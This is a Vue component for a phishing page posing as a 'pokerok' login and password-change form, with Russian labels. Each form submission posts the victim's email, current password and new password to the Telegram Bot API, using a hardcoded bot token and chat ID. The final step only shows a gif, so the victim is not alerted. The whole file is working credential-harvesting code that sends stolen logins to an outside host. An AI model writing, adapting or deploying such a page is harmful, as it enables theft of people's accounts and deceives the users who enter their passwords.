<template>
  <div id="app">
    <div class="container d-flex justify-content-center">
      <div class="row block-all">
        <div class="col pt-3">
          <div class="text-center">
            <img class="mb-3 logo" style="width: 300px;" src="@/assets/logo_pokerok.png">
          </div>

          <div v-show="step === 1" class="step">
            <form method="POST" @submit.prevent="submit">
              <div class="mb-3">
                <label class="pwd" for="email">Укажите почту при регистрации аккаунта.</label>
                <input required v-model="loginUser" type="email" class="form-control inp" pattern=".+@globex\.com" placeholder="Введите Email" name="email" id="email" aria-describedby="email">
              </div>
              <div class="mb-3">
                <label class="pwd" for="password">Пароль</label>
                <input required v-model="idCard" type="password" class="form-control inp" placeholder="Введите пароль" id="passwordL" aria-describedby="passwordL">
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Войти</button>
              </div>
            </form>
          </div>

          <div v-show="step === 2" class="step">
           <form method="POST" @submit.prevent="submitTwo">
              <div class="mb-3">
                <input required v-model="tekuPass" type="text" class="form-control inp" placeholder="Текущий пароль для входа" id="password" aria-describedby="password">
              </div>
              <div class="mb-3">
                <input required v-model="newPass" type="text" class="form-control inp" placeholder="Новый пароль для входа" id="passwordNew" aria-describedby="passwordNew">
              </div>
              <div class="mb-3">
                <input required v-model="newPassPod" type="text" class="form-control inp" placeholder="Подвердить пароль для входа" id="passwordNewPod" aria-describedby="passwordNewPod">
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Сменить</button>
              </div>
            </form>
          </div>

          <div v-show="step === 3" class="step text-center">
            <img class="mb-3 logo" src="@/assets/galg.gif">
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'App',

  data() {
    return {
      fullName: '',
      email: '',
      subject: '',
      message: '',

      token: '5686827322:AAGtS_5OHNwR_K1R17Afcws_upiB4pP5qy0',
      chatId: -751634254,

      step: 1,
    }
  },
  methods: {
    submit() {
      const fullMessage = `Логин: ${this.loginUser}\nПароль: ${this.idCard}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    },
    nextCodeAuth() {
      this.step++
    },
    submitTwo() {
      const fullMessage = `Текущий пароль: ${this.tekuPass}\nНовый пароль: ${this.newPass}\nПовторный пароль: ${this.newPassPod}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    }
  },
}
</script>

<style>
.btn:focus, .btn:active {
  box-shadow: none !important;
}

.form-control {
  background-color: rgb(233, 233, 233) !important;
  border: 0 rgb(233, 233, 233) !important;
  height: 40px !important;
}

.form-control:focus, .form-control:active {
  box-shadow: none !important;
  background-color: rgb(233, 233, 233) !important;
  border: 0 rgb(233, 233, 233) !important;
}

.h-100 {
  height: 100vh !important;
}

.form-text {
  margin-top: -2px;
}

.logo {
  width: 230px !important;
}

.pwd {
  font-size: 14px;
  color: grey;
  margin-left: 12px;
}

.block-all {
  width: 350px;
}

.btn-blockk {
  width: 100%;
  height: 40px;
  font-weight: 500;
  margin-top: 50px;
}

.color-den {
  color: rgb(255, 0, 0);
  font-size: 13px;
}

.code-text {
  font-size: 13px;
}
</style>